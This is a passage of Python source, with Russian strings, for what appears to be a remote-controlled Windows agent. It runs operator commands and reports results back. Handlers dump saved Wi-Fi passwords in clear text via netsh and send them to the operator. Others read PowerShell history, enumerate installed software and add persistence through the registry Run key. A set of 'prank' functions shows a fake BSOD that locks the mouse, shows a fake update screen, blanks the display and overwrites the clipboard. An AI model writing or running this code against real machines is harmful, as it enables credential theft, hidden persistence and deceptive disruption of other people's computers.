    def _do_prank_hide_desktop(self, payload: dict) -> None:
        hide = bool(payload.get("hide", True))
        try:
            progman = ctypes.windll.user32.FindWindowW("Progman", None)
            def_view = ctypes.windll.user32.FindWindowExW(progman, None, "SHELLDLL_DefView", None)
            listview = ctypes.windll.user32.FindWindowExW(def_view, None, "SysListView32", None)
            if listview:
                cmd = 0 if hide else 5
                ctypes.windll.user32.ShowWindow(listview, cmd)
            ok = True
        except Exception:
            ok = False
        self._publish_response("prank_hide_desktop", {"type": "prank_hide_desktop", "device_id": DEVICE_ID, "ok": ok, "hide": hide})

    def _do_prank_dancing_windows(self, payload: dict) -> None:
        duration = min(int(payload.get("duration", 10) or 10), 30)
        def _run():
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if not hwnd:
                return
            class RECT(ctypes.Structure):
                _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                            ("right", ctypes.c_long), ("bottom", ctypes.c_long)]
            rc = RECT()
            ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rc))
            w, h = rc.right - rc.left, rc.bottom - rc.top
            orig_x, orig_y = rc.left, rc.top
            deadline = time.time() + duration
            offset = 25
            while time.time() < deadline:
                ctypes.windll.user32.MoveWindow(hwnd, orig_x + offset, orig_y, w, h, True)
                time.sleep(0.05)
                ctypes.windll.user32.MoveWindow(hwnd, orig_x - offset, orig_y, w, h, True)
                time.sleep(0.05)
            ctypes.windll.user32.MoveWindow(hwnd, orig_x, orig_y, w, h, True)
        threading.Thread(target=_run, name="xgent-dancewin", daemon=True).start()
        self._publish_response("prank_dancing_windows", {"type": "prank_dancing_windows", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_black_screen(self, payload: dict) -> None:
        SC_MONITORPOWER = 0xF170
        WM_SYSCOMMAND = 0x0112
        HWND_BROADCAST = 0xFFFF
        ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        self._publish_response("prank_black_screen", {"type": "prank_black_screen", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_random_site(self, payload: dict) -> None:
        SITES = [
            "https://hackertyper.net/",
            "https://pointerpointer.com/",
            "https://theuselessweb.com/",
            "https://cat-bounce.com/",
            "https://zoomquilt.org/",
        ]
        site = random.choice(SITES)
        webbrowser.open_new_tab(site)
        self._publish_response("prank_random_site", {"type": "prank_random_site", "device_id": DEVICE_ID, "ok": True, "url": site})

    def _do_display_brightness(self, payload: dict) -> None:
        """Установить яркость экрана 0-100 через WMI WmiSetBrightness."""
        lvl = _clamp(payload.get("level"), 0, 100, 50)
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command",
                 "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness"],
                text=True, stderr=subprocess.DEVNULL, timeout=8,
            )
            before = (out.strip() or "?").splitlines()[-1]
        except Exception:
            before = "?"
        try:
            ps = f"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, {lvl})"
            subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", ps],
                text=True, stderr=subprocess.DEVNULL, timeout=8,
            )
            ok, text = True, f"🔆 Яркость: {before}% → {lvl}%"
        except Exception as exc:
            try:
                import screen_brightness_control as sbc
                sbc.set_brightness(lvl)
                ok, text = True, f"🔆 Яркость (sbc): {lvl}%"
            except Exception:
                ok, text = False, f"⚠️ Не удалось изменить яркость: {exc}"
        self._publish_response("display_brightness", {
            "type": "display_brightness", "device_id": DEVICE_ID,
            "ok": ok, "level": lvl, "text": text,
        })
        self._publish_response("output", {
            "type": "display_brightness", "device_id": DEVICE_ID,
            "ok": ok, "text": text,
        })

    def _do_display_night_light(self, payload: dict) -> None:
        """Вкл/выкл «Ночной свет» через CloudStore-реестр (winreg)."""
        import winreg

        wanted = bool(payload.get("enabled", True))
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, NL_STATE_SUBKEY, 0, winreg.KEY_READ | winreg.KEY_SET_VALUE)
            data, _ = winreg.QueryValueEx(key, "Data")
        except FileNotFoundError:
            self._publish_response("display_night_light", {
                "type": "display_night_light", "device_id": DEVICE_ID, "ok": False,
                "text": "⚠️ Ключ Night Light (CloudStore) не найден — функция недоступна на этой системе.",
            })
            return
        except Exception as exc:
            self._publish_response("display_night_light", {
                "type": "display_night_light", "device_id": DEVICE_ID, "ok": False,
                "text": f"⚠️ Ошибка доступа к реестру: {exc}",
            })
            return
        try:
            current = _night_light_enabled(data)
            if current != wanted:
                winreg.SetValueEx(key, "Data", 0, winreg.REG_BINARY, _night_light_toggle_bytes(data))
            winreg.CloseKey(key)
            state = "включён" if wanted else "выключен"
            ok, text = True, f"🌙 Ночной свет {state}"
        except Exception as exc:
            ok, text = False, f"⚠️ Ошибка переключения Night Light: {exc}"
        self._publish_response("display_night_light", {
            "type": "display_night_light", "device_id": DEVICE_ID,
            "ok": ok, "enabled": wanted, "text": text,
        })

    def _do_display_rotate(self, payload: dict) -> None:
        """Повернуть экран: angle 0/90/180/270 через ChangeDisplaySettingsEx."""
        angle = payload.get("angle", 0)
        ok, text = _rotate_screen(angle)
        self._publish_response("display_rotate", {
            "type": "display_rotate", "device_id": DEVICE_ID,
            "ok": ok, "angle": angle, "text": text,
        })

    def _do_net_wifi_passwords(self, payload: dict) -> None:
        """Список сохранённых Wi-Fi сетей и паролей (netsh key=clear)."""
        try:
            profiles_out = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                text=True, stderr=subprocess.DEVNULL, timeout=10, encoding="utf-8", errors="ignore",
            )
            names = _parse_wifi_profile_names(profiles_out)
            if not names:
                text, ok = "📶 Сохранённые Wi-Fi сети не найдены.", True
            else:
                rows, shown = [], names[:15]
                for n in shown:
                    try:
                        out = subprocess.check_output(
                            ["netsh", "wlan", "show", "profile", f"name={n}", "key=clear"],
                            text=True, stderr=subprocess.DEVNULL, timeout=10,
                            encoding="utf-8", errors="ignore",
                        )
                        pwd = _parse_key_content(out)
                        rows.append(f"• {n}: {pwd or '(без ключа)'}")
                    except Exception:
                        rows.append(f"• {n}: (недоступен)")
                text = "📶 Сохранённые Wi-Fi:\n" + "\n".join(rows)
                if len(names) > len(shown):
                    text += f"\n… и ещё {len(names) - len(shown)}"
                ok = True
        except Exception as exc:
            text, ok = f"⚠️ Wi-Fi: {exc}", False
        self._publish_response("net_wifi_passwords", {
            "type": "net_wifi_passwords", "device_id": DEVICE_ID, "ok": ok, "text": text[:3800],
        })

    def _do_net_bluetooth_list(self, payload: dict) -> None:
        """Список активных Bluetooth-устройств (Get-PnpDevice)."""
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command",
                 "Get-PnpDevice -Class Bluetooth -Status OK | Select-Object -First 20 -ExpandProperty FriendlyName"],
                text=True, stderr=subprocess.DEVNULL, timeout=15,
            )
            items = [l.strip() for l in out.splitlines() if l.strip()]
            text = "🔵 Bluetooth устройства:\n" + ("\n".join(f"• {i}" for i in items) or "(нет активных)")
            ok = True
        except Exception as exc:
            items, text, ok = [], f"⚠️ Bluetooth: {exc}", False
        self._publish_response("net_bluetooth_list", {
            "type": "net_bluetooth_list", "device_id": DEVICE_ID,
            "ok": ok, "items": items[:20], "text": text,
        })

    def _do_storage_smart(self, payload: dict) -> None:
        """Здоровье дисков (SMART) через Get-PhysicalDisk/Get-StorageReliabilityCounter."""
        ps = (
            "$disks = Get-PhysicalDisk; "
            "foreach ($d in $disks) { "
            "  $r = $null; "
            "  try { $r = $d | Get-StorageReliabilityCounter -ErrorAction Stop } catch { $r = $null }; "
            "  [PSCustomObject]@{ "
            "    FriendlyName = $d.FriendlyName; MediaType = $d.MediaType; "
            "    Health = $d.HealthStatus; "
            "    Temp = if ($r) { $r.Temperature } else { $null }; "
            "    Wear = if ($r) { $r.Wear } else { $null } "
            "  } "
            "} | ConvertTo-Json -Compress"
        )
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", ps],
                text=True, stderr=subprocess.DEVNULL, timeout=20,
            ).strip()
            import json as _json
            data = _json.loads(out) if out else []
            if isinstance(data, dict):
                data = [data]
            if not data:
                text, ok = "🩺 Накопители не найдены.", True
            else:
                lines = []
                for d in data:
                    temp = d.get("Temp")
                    wear = d.get("Wear")
                    lines.append(
                        f"• {d.get('FriendlyName')} [{d.get('MediaType')}] — "
                        f"{d.get('Health')}"
                        + (f", {temp}°C" if temp is not None else "")
                        + (f", износ {wear}%" if wear is not None else "")
                    )
                text, ok = "🩺 SMART и здоровье накопителей:\n" + "\n".join(lines), True
        except Exception as exc:
            text, ok = f"⚠️ SMART: {exc}", False
        self._publish_response("storage_smart", {
            "type": "storage_smart", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    def _do_sys_installed_apps(self, payload: dict) -> None:
        """Установленное ПО: Uninstall-ключи реестра 64-bit + 32-bit (WOW6432Node)."""
        ps = (
            "$paths = @( "
            "'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', "
            "'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', "
            "'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' "
            "); $names = @(); "
            "foreach ($p in $paths) { $names += (Get-ItemProperty $p -ErrorAction SilentlyContinue | "
            "Where-Object { $_.DisplayName } | Select-Object -ExpandProperty DisplayName) }; "
            "$names | Sort-Object -Unique"
        )
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command", ps],
                text=True, stderr=subprocess.DEVNULL, timeout=25,
            )
            items = sorted({l.strip() for l in out.splitlines() if l.strip()})
            total = len(items)
            shown = items[:40]
            text = f"📦 Установленные программы ({total}):\n" + "\n".join(f"• {i}" for i in shown)
            if total > len(shown):
                text += f"\n… и ещё {total - len(shown)}"
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ Ошибка получения софта: {exc}", False
        self._publish_response("sys_installed_apps", {
            "type": "sys_installed_apps", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    def _do_sys_history_cmd(self, payload: dict) -> None:
        """Последние команды из истории PowerShell (PSReadLine)."""
        lines = _clamp(payload.get("lines"), 1, 200, 30)
        appdata = os.environ.get("APPDATA", "")
        hist_path = os.path.join(appdata, r"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
        try:
            if os.path.exists(hist_path):
                with open(hist_path, "r", encoding="utf-8", errors="ignore") as f:
                    history = [l.strip() for l in f if l.strip()][-lines:]
                text = "🕘 История PowerShell (последние):\n" + "\n".join(f"• {h}" for h in history)
                ok = True
            else:
                text, ok = "История PowerShell не найдена.", True
        except Exception as exc:
            text, ok = f"⚠️ Ошибка чтения истории: {exc}", False
        self._publish_response("sys_history_cmd", {
            "type": "sys_history_cmd", "device_id": DEVICE_ID, "ok": ok, "text": text[:3800],
        })

    # ---------- Режим ожидания (Watchdog) и автозапуск ----------

    def _do_standby_sleep(self, payload: dict) -> None:
        """Перевод агента в спящий режим ожидания (Watchdog)."""
        self._standby = True
        self._publish_status()
        text = "💤 Агент переведён в спящий режим (Standby).\nБольшинство функций приостановлено. Для возобновления используйте кнопку «☀️ Пробудить агента»."
        self._publish_response("output", {
            "type": "standby_sleep", "device_id": DEVICE_ID, "ok": True, "text": text,
        })

    def _do_wake(self, payload: dict) -> None:
        """Пробуждение агента из спящего режима."""
        self._standby = False
        self._publish_status()
        text = "☀️ Агент успешно пробуждён и готов к приёму всех команд!"
        self._publish_response("output", {
            "type": "wake", "device_id": DEVICE_ID, "ok": True, "text": text,
        })

    def _do_autorun_status(self, payload: dict) -> None:
        """Проверка статуса автозапуска в реестре Windows."""
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
                val, _ = winreg.QueryValueEx(key, "XGENT")
                text = f"🚀 Автозапуск Windows: ✅ ВКЛЮЧЕН\nПараметр: {val}"
                ok = True
        except FileNotFoundError:
            text = "🚀 Автозапуск Windows: ❌ ВЫКЛЮЧЕН\n(Агент не запускается при входе в систему)"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка проверки автозапуска: {exc}"
            ok = False
        self._publish_response("output", {
            "type": "autorun_status", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    def _do_autorun_enable(self, payload: dict) -> None:
        """Включение автозапуска в реестре Windows (HKCU\\...\\Run)."""
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            cur_dir = Path(__file__).resolve().parent
            exe_path = cur_dir / "XGENT-WDS.exe"
            if getattr(sys, "frozen", False):
                cmd = f'"{sys.executable}"'
            elif exe_path.exists():
                cmd = f'"{exe_path}"'
            else:
                pyw = cur_dir / "venv" / "Scripts" / "pythonw.exe"
                if not pyw.exists():
                    pyw = Path(sys.executable).parent / "pythonw.exe"
                if not pyw.exists():
                    pyw = Path(sys.executable)
                cmd = f'"{pyw}" "{cur_dir / "xgent_wds.py"}"'
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.SetValueEx(key, "XGENT", 0, winreg.REG_SZ, cmd)
            text = f"✅ Автозапуск Windows успешно добавлен в реестр!\nКоманда запуска: {cmd}"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка включения автозапуска: {exc}"
            ok = False
        self._publish_response("output", {
            "type": "autorun_enable", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    def _do_autorun_disable(self, payload: dict) -> None:
        """Отключение автозапуска в реестре Windows."""
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                try:
                    winreg.DeleteValue(key, "XGENT")
                    text = "🛑 Автозапуск Windows успешно удалён из реестра."
                except FileNotFoundError:
                    text = "ℹ️ Автозапуск Windows уже был отключен."
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка отключения автозапуска: {exc}"
            ok = False
        self._publish_response("output", {
            "type": "autorun_disable", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    # ---------- Системные утилиты и диагностика ----------

    def _do_sys_uptime(self, payload: dict) -> None:
        """Время непрерывной работы системы (Uptime)."""
        try:
            boot_ts = psutil.boot_time()
            uptime_secs = int(time.time() - boot_ts)
            days, rem = divmod(uptime_secs, 86400)
            hours, rem = divmod(rem, 3600)
            minutes, secs = divmod(rem, 60)
            boot_dt = time.strftime("%d.%m.%Y %H:%M:%S", time.localtime(boot_ts))
            text = (
                f"⏱ Время работы системы (Uptime):\n"
                f"• Аптайм: {days} дн. {hours} ч. {minutes} мин. {secs} сек.\n"
                f"• Время загрузки: {boot_dt}"
            )
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка получения аптайма: {exc}"
            ok = False
        self._publish_response("output", {
            "type": "sys_uptime", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    def _do_sys_clean_temp(self, payload: dict) -> None:
        """Очистка временных файлов TEMP/TMP (безопасное удаление)."""
        try:
            temp_dirs = [os.environ.get("TEMP"), os.environ.get("TMP"), r"C:\Windows\Temp"]
            cleaned_files = 0
            freed_bytes = 0
            for tdir in temp_dirs:
                if not tdir or not os.path.exists(tdir):
                    continue
                for root, dirs, files in os.walk(tdir, topdown=False):
                    for f in files:
                        fp = os.path.join(root, f)
                        try:
                            sz = os.path.getsize(fp)
                            os.remove(fp)
                            cleaned_files += 1
                            freed_bytes += sz
                        except Exception:
                            pass
                    for d in dirs:
                        dp = os.path.join(root, d)
                        try:
                            os.rmdir(dp)
                        except Exception:
                            pass
            freed_mb = freed_bytes / (1024 * 1024)
            text = (
                f"🧹 Очистка временных файлов завершена!\n"
                f"• Удалено файлов: {cleaned_files}\n"
                f"• Освобождено места: {freed_mb:.2f} МБ"
            )
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка очистки: {exc}"
            ok = False
        self._publish_response("output", {
            "type": "sys_clean_temp", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    def _do_net_ping(self, payload: dict) -> None:
        """Проверка доступности узла (Ping)."""
        host = payload.get("host", "8.8.8.8")
        host = re.sub(r"[^\w\.-]", "", str(host)) or "8.8.8.8"
        try:
            res = subprocess.run(
                ["ping", "-n", "4", host],
                capture_output=True, text=True, timeout=10,
            )
            output = res.stdout or res.stderr
            text = f"🏓 Результаты Ping к {host}:\n```\n{output.strip()[:3500]}\n```"
            ok = (res.returncode == 0)
        except Exception as exc:
            text = f"⚠️ Ошибка ping: {exc}"
            ok = False
        self._publish_response("output", {
            "type": "net_ping", "device_id": DEVICE_ID, "ok": ok, "text": text,
        })

    # ---------- Расширенная матрица приколов (40 приколов) ----------

    def _do_prank_bsod(self, payload: dict) -> None:
        """Полноэкранный фейковый BSOD с анимацией и скрытием курсора мыши."""
        def _bsod():
            try:
                import tkinter as tk
                root = tk.Tk()
                root.title("System Fatal Error")
                root.attributes("-fullscreen", True)
                root.attributes("-topmost", True)
                root.config(cursor="none")
                root.configure(bg="#0078D7")

                root.bind("<Escape>", lambda e: root.destroy())
                root.bind("<Double-Button-1>", lambda e: root.destroy())

                sw = root.winfo_screenwidth()
                sh = root.winfo_screenheight()

                active = True
                def _mouse_lock():
                    user32 = ctypes.windll.user32
                    while active:
                        user32.SetCursorPos(sw // 2, sh // 2)
                        time.sleep(0.08)
                threading.Thread(target=_mouse_lock, daemon=True).start()

                frame = tk.Frame(root, bg="#0078D7")
                frame.place(relx=0.08, rely=0.15, relwidth=0.85, relheight=0.7)

                lbl_sad = tk.Label(frame, text=":(", font=("Segoe UI", 90), fg="white", bg="#0078D7")
                lbl_sad.pack(anchor="w", pady=(0, 20))

                msg_text = (
                    "На вашем ПК возникла проблема, и его необходимо перезагрузить.\n"
                    "Мы лишь собираем некоторые сведения об ошибке, а затем будет\n"
                    "выполнена автоматическая перезагрузка.\n"
                )
                lbl_msg = tk.Label(frame, text=msg_text, font=("Segoe UI Light", 22), fg="white", bg="#0078D7", justify="left")
                lbl_msg.pack(anchor="w", pady=(0, 25))

                lbl_pct = tk.Label(frame, text="0% завершено", font=("Segoe UI Light", 24), fg="white", bg="#0078D7")
                lbl_pct.pack(anchor="w", pady=(0, 40))

                bottom_frame = tk.Frame(frame, bg="#0078D7")
                bottom_frame.pack(anchor="w", fill="x")

                qr_canvas = tk.Canvas(bottom_frame, width=95, height=95, bg="white", highlightthickness=0)
                qr_canvas.pack(side="left", padx=(0, 20))

                stop_text = (
                    "Для получения дополнительных сведений об этой проблеме посетите\n"
                    "https://www.windows.com/stopcode\n\n"
                    "Код остановки: CRITICAL_PROCESS_DIED\n"
                    "Что вызвало проблему: win32kbase.sys"
                )
                lbl_stop = tk.Label(bottom_frame, text=stop_text, font=("Segoe UI", 12), fg="white", bg="#0078D7", justify="left")
                lbl_stop.pack(side="left", anchor="w")

                pct = 0
                def _update_pct():
                    nonlocal pct
                    if pct < 100:
                        pct += 15
                        if pct > 100:
                            pct = 100
                        lbl_pct.config(text=f"{pct}% завершено")
                        root.after(1400, _update_pct)
                    else:
                        root.after(2000, _close)

                def _close():
                    nonlocal active
                    active = False
                    try:
                        root.destroy()
                    except Exception:
                        pass

                root.after(1200, _update_pct)
                root.after(18000, _close)
                root.mainloop()
                active = False
            except Exception as e:
                log.error("BSOD error: %s", e)

        threading.Thread(target=_bsod, daemon=True, name="xgent-bsod").start()
        self._publish_response("output", {"type": "prank_bsod", "device_id": DEVICE_ID, "ok": True, "text": "💀 Полноэкранный BSOD (со скрытием мыши и блокировкой экрана) активирован!"})

    def _do_prank_fake_update(self, payload: dict) -> None:
        """Полноэкранный фейковый экран обновления Windows 11 с анимированным спиннером."""
        def _update_screen():
            try:
                import tkinter as tk
                root = tk.Tk()
                root.title("Windows Update")
                root.attributes("-fullscreen", True)
                root.attributes("-topmost", True)
                root.config(cursor="none")
                root.configure(bg="#000000")

                root.bind("<Escape>", lambda e: root.destroy())
                root.bind("<Double-Button-1>", lambda e: root.destroy())

                frame = tk.Frame(root, bg="#000000")
                frame.place(relx=0.5, rely=0.5, anchor="center")

                spinner = tk.Canvas(frame, width=80, height=80, bg="#000000", highlightthickness=0)
                spinner.pack(pady=20)

                lbl_title = tk.Label(frame, text="Работа с обновлениями", font=("Segoe UI", 26), fg="white", bg="#000000")
                lbl_title.pack(pady=(10, 5))

                lbl_pct = tk.Label(frame, text="1% завершено", font=("Segoe UI", 20), fg="white", bg="#000000")
                lbl_pct.pack(pady=5)

                lbl_sub = tk.Label(frame, text="Не выключайте компьютер. Это займет некоторое время.\nКомпьютер может перезагрузиться несколько раз.", font=("Segoe UI Light", 14), fg="#cccccc", bg="#000000", justify="center")
                lbl_sub.pack(pady=(15, 0))

                angle = 0
                def _spin():
                    nonlocal angle
                    spinner.delete("all")
                    import math
                    cx, cy, r = 40, 40, 25
                    for i in range(6):
                        a = math.radians(angle + i * 35)
                        x = cx + r * math.cos(a)
                        y = cy + r * math.sin(a)
                        dot_r = 3 + i * 0.8
                        spinner.create_oval(x - dot_r, y - dot_r, x + dot_r, y + dot_r, fill="white", outline="")
                    angle = (angle + 18) % 360
                    root.after(40, _spin)

                pct = 1
                def _inc():
                    nonlocal pct
                    if pct < 100:
                        pct += 3
                        if pct > 100:
                            pct = 100
                        lbl_pct.config(text=f"{pct}% завершено")
                        root.after(1000, _inc)
                    else:
                        root.after(1500, root.destroy)

                _spin()
                root.after(800, _inc)
                root.after(22000, lambda: root.destroy())
                root.mainloop()
            except Exception as e:
                log.error("Fake update error: %s", e)

        threading.Thread(target=_update_screen, daemon=True, name="xgent-fakeupdate").start()
        self._publish_response("output", {"type": "prank_fake_update", "device_id": DEVICE_ID, "ok": True, "text": "⏳ Полноэкранное обновление Windows 11 (со скрытием курсора) запущено!"})

    def _do_prank_toast_spam(self, payload: dict) -> None:
        """Спам 5 системными уведомлениями в трее."""
        try:
            ps = (
                "[reflection.assembly]::loadwithpartialname('System.Windows.Forms') | Out-Null; "
                "$notify = New-Object System.Windows.Forms.NotifyIcon; "
                "$notify.Icon = [System.Drawing.SystemIcons]::Information; "
                "$notify.Visible = $True; "
                "1..5 | ForEach-Object { "
                "  $notify.ShowBalloonTip(3000, 'Внимание системы #'+$_, 'Зафиксировано вторжение космических котов!', [System.Windows.Forms.ToolTipIcon]::Warning); "
                "  Start-Sleep -Milliseconds 700 "
                "}; $notify.Dispose()"
            )
            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
            text = "🔔 Серия из 5 фейковых системных уведомлений запущена в трее!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка уведомлений: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_toast_spam", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_keyboard_disco(self, payload: dict) -> None:
        """Мигание индикаторами клавиатуры (CapsLock, NumLock, ScrollLock)."""
        def _disco():
            user32 = ctypes.windll.user32
            keys = [0x14, 0x90, 0x91]
            for _ in range(12):
                for k in keys:
                    user32.keybd_event(k, 0x45, 1, 0)
                    user32.keybd_event(k, 0x45, 1 | 2, 0)
                    time.sleep(0.12)
        threading.Thread(target=_disco, daemon=True).start()
        self._publish_response("output", {"type": "prank_keyboard_disco", "device_id": DEVICE_ID, "ok": True, "text": "💃 Дискотека клавиатуры (индикаторы Caps/Num/Scroll) активирована!"})

    def _do_prank_beep_morse(self, payload: dict) -> None:
        """Звуковой сигнал азбукой Морзе (SOS) через динамики."""
        def _morse():
            pattern = [(1000, 150)] * 3 + [(1000, 400)] * 3 + [(1000, 150)] * 3
            for freq, dur in pattern:
                try:
                    winsound.Beep(freq, dur)
                    time.sleep(0.08)
                except Exception:
                    pass
        threading.Thread(target=_morse, daemon=True).start()
        self._publish_response("output", {"type": "prank_beep_morse", "device_id": DEVICE_ID, "ok": True, "text": "📻 Сигнал Морзе (S.O.S) воспроизведён в динамиках!"})

    def _do_prank_open_notepad_type(self, payload: dict) -> None:
        """Открытие блокнота с эффектом живого набора текста."""
        msg = payload.get("text") or "Привет... Я слежу за тобой через розетку 👁️"
        clean_msg = msg.replace("'", " ").replace('"', " ")
        ps = (
            f"$ws = New-Object -ComObject WScript.Shell; "
            f"Start-Process notepad.exe; "
            f"Start-Sleep -Milliseconds 800; "
            f"$ws.AppActivate('Notepad'); "
            f"Start-Sleep -Milliseconds 400; "
            f"'{clean_msg}'.ToCharArray() | ForEach-Object {{ "
            f"  $ws.SendKeys($_); Start-Sleep -Milliseconds 120 "
            f"}}"
        )
        subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
        self._publish_response("output", {"type": "prank_open_notepad_type", "device_id": DEVICE_ID, "ok": True, "text": f"📝 Блокнот открыт, текст '{clean_msg[:40]}...' печатается!"})

    def _do_prank_hacker_typer(self, payload: dict) -> None:
        """Открытие интерактивного Hacker Typer."""
        try:
            webbrowser.open("https://hackertyper.net")
            text = "🧑‍💻 Hacker Typer открыт в браузере!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_hacker_typer", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_sound_spooky(self, payload: dict) -> None:
        """Жуткие потусторонние звуки."""
        def _play():
            try:
                for f in (300, 315, 290, 420, 260, 240, 500, 200):
                    winsound.Beep(f, 350)
            except Exception:
                pass
        threading.Thread(target=_play, daemon=True).start()
        self._publish_response("output", {"type": "prank_sound_spooky", "device_id": DEVICE_ID, "ok": True, "text": "👻 Потусторонние жуткие звуки воспроизведены!"})

    def _do_prank_sound_fart(self, payload: dict) -> None:
        """Смешной звуковой эффект."""
        def _play():
            try:
                for f in (180, 160, 140, 120, 110, 95, 80):
                    winsound.Beep(f, 80)
            except Exception:
                pass
        threading.Thread(target=_play, daemon=True).start()
        self._publish_response("output", {"type": "prank_sound_fart", "device_id": DEVICE_ID, "ok": True, "text": "💨 Смешной звуковой эффект воспроизведён!"})

    def _do_prank_minimize_all(self, payload: dict) -> None:
        """Сворачивание всех открытых окон."""
        try:
            ps = "(New-Object -ComObject Shell.Application).MinimizeAll()"
            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
            text = "📉 Все открытые окна свернуты на рабочий стол!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_minimize_all", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_open_calc_spam(self, payload: dict) -> None:
        """Каскад из 5 калькуляторов."""
        try:
            for _ in range(5):
                subprocess.Popen("calc.exe", shell=True)
                time.sleep(0.2)
            text = "🔢 5 калькуляторов открыты каскадом!"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_open_calc_spam", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_invert_screen(self, payload: dict) -> None:
        """Переворот экрана на 180° на 7 секунд с автовозвратом."""
        def _flip():
            _rotate_screen(180)
            time.sleep(7)
            _rotate_screen(0)
        threading.Thread(target=_flip, daemon=True).start()
        self._publish_response("output", {"type": "prank_invert_screen", "device_id": DEVICE_ID, "ok": True, "text": "🙃 Экран перевернут вверх дном на 7 секунд!"})

    def _do_prank_slow_mouse(self, payload: dict) -> None:
        """Замедление скорости указателя мыши на 8 секунд с восстановлением."""
        def _slow():
            user32 = ctypes.windll.user32
            cur_speed = ctypes.c_uint()
            user32.SystemParametersInfoW(0x0070, 0, ctypes.byref(cur_speed), 0)
            orig = cur_speed.value or 10
            user32.SystemParametersInfoW(0x0071, 0, 1, 0)
            time.sleep(8)
            user32.SystemParametersInfoW(0x0071, 0, orig, 0)
        threading.Thread(target=_slow, daemon=True).start()
        self._publish_response("output", {"type": "prank_slow_mouse", "device_id": DEVICE_ID, "ok": True, "text": "🐌 Мышь замедлена до минимальной скорости на 8 секунд!"})

    def _do_prank_random_clicks(self, payload: dict) -> None:
        """Случайные подёргивания курсора мыши на 5 секунд."""
        def _jiggle():
            user32 = ctypes.windll.user32
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            for _ in range(25):
                user32.GetCursorPos(ctypes.byref(pt))
                user32.SetCursorPos(pt.x + random.randint(-15, 15), pt.y + random.randint(-15, 15))
                time.sleep(0.2)
        threading.Thread(target=_jiggle, daemon=True).start()
        self._publish_response("output", {"type": "prank_random_clicks", "device_id": DEVICE_ID, "ok": True, "text": "🤹 Случайные подёргивания мыши активированы на 5 секунд!"})

    def _do_prank_paste_clipboard_spam(self, payload: dict) -> None:
        """Подмена буфера обмена на забавную фразу."""
        try:
            import pyperclip
            meme = "( ͡° ͜ʖ ͡°) Взлом жопы завершен на 99.9%"
            pyperclip.copy(meme)
            text = f"📋 В буфер обмена подложен мем:\n'{meme}'"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
        self._publish_response("output", {"type": "prank_paste_clipboard_spam", "device_id": DEVICE_ID, "ok": ok, "text": text})

    def _do_prank_type_reversed(self, payload: dict) -> None:
        """Инвертирование содержимого буфера обмена задом наперёд."""
        try:
            import pyperclip
            cur = pyperclip.paste() or "Привет мир"
            rev = cur[::-1]
            pyperclip.copy(rev)
            text = f"🔄 Буфер обмена инвертирован задом наперёд:\n{rev[:100]}"
            ok = True
        except Exception as exc:
            text = f"⚠️ Ошибка: {exc}"
            ok = False
